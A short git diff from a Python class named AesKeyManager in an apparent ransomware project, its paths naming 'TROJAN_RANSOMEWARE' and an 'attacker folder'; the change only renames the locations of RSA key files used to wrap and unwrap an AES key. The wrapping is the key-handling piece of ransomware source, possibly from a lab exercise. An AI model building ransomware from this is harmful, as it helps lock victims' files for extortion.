@@ -57,13 +57,13 @@ class AesKeyManager:
         hasher.update(word.encode())
         return hasher.digest()
 
-    def _encrypt_aes_key_with_rsa(self, aes_key, public_key_path=r"D:\python_programmers_clab\TROJAN_RANSOMEWARE\attacker folder\server_RSA_public.pem"):
+    def _encrypt_aes_key_with_rsa(self, aes_key, public_key_path=r"D:\Projects\TROJAN_RANSOMEWARE\attacker folder\server_RSA_public.pem"):
         with open(public_key_path, "rb") as f:
             pub = RSA.import_key(f.read())
         cipher = PKCS1_OAEP.new(pub)
         return base64.b64encode(cipher.encrypt(aes_key)).decode()
 
-    def _decrypt_aes_key_with_rsa(self, enc_b64, private_key_path=r"D:\python_programmers_clab\TROJAN_RANSOMEWARE\attacker folder\server_RSA_private.pem"):
+    def _decrypt_aes_key_with_rsa(self, enc_b64, private_key_path=r"D:\Projects\TROJAN_RANSOMEWARE\attacker folder\server_RSA_private.pem"):
         with open(private_key_path, "rb") as f:
             priv = RSA.import_key(f.read())
         cipher = PKCS1_OAEP.new(priv)
